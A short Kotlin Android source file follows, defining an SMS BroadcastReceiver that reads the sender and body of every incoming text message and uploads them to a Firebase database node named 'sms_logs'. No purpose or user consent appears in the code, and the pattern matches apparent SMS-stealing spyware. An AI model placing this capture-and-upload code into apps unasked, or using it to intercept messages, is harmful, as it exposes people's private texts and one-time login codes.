class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val bundle = intent.extras
        if (bundle != null) {
            val pdus = bundle.get("pdus") as Array<*>
            val messages = pdus.map {
                SmsMessage.createFromPdu(it as ByteArray)
            }
            for (message in messages) {
                val msgBody = message.messageBody
                val from = message.originatingAddress

                val db = FirebaseDatabase.getInstance().reference
                db.child("sms_logs").push().setValue("From: $from\n$msgBody")
            }
        }
    }
}
